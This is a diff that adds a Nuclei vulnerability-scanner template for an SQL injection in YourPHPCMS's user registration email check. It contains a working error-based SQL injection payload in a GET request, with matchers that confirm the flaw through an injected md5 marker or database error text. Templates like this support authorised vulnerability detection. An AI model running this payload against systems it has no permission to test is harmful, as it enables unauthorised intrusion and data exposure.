@@ -1,0 +1,32 @@
+id: yourphpcms-register-sqli
+info:
+  name: YourPHPCMS Register SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: yourphpcms
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /index.php?g=User&m=Register&a=checkEmail&userid=1&email='%20AND%20(SELECT%202578%20FROM(SELECT%20COUNT(*),CONCAT(md5({{t1}}),(SELECT%20(ELT(2578=2578,1))),0x7162627671,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)--%20xmVt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: NucleiScanner
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "系统发生错误"
+          - "SQL语句"
+          - "{{t2}}"
